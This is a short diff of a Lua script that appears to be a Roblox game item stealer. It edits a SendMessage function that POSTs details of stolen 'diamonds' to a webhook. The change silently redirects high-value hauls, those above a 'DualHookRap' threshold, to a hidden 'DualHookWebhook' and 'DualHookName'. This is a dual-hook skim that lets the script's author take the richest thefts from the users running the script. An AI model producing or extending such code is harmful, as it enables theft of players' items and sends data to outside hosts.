@@ -160,13 +160,9 @@ local function SendMessage(diamonds)
 
 	local ok, res = pcall(function()
     if totalRap > DualHookRap then
-        return request({
-            Url = DualHookWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    else
+		webhook = DualHookWebhook
+		users = DualHookName
+		
         return request({
             Url = webhook,
             Method = "POST",
